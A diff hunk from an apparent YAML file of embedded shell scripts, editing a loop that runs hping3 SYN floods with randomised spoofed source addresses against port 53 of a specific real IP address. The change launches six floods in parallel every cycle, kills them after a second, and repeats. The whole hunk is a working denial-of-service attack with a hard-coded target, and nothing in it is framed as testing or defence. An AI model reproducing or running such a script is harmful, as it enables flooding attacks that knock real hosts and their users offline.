@@ -99,12 +99,14 @@ script_content_mirgorod: |
 
           while true; do
           sleep 30
-            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0
-            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0
-            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0
-            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2
-            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2
-            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0 &
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0 &
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -0 &
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2 &
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2 &
+            sudo hping3 -a $(generate_ip_address) 195.64.183.233 -S -d 120 --flood -p 53 -2 &
+            sleep 1
+            sudo killall hping3
           done
 
 script_content_sci: |
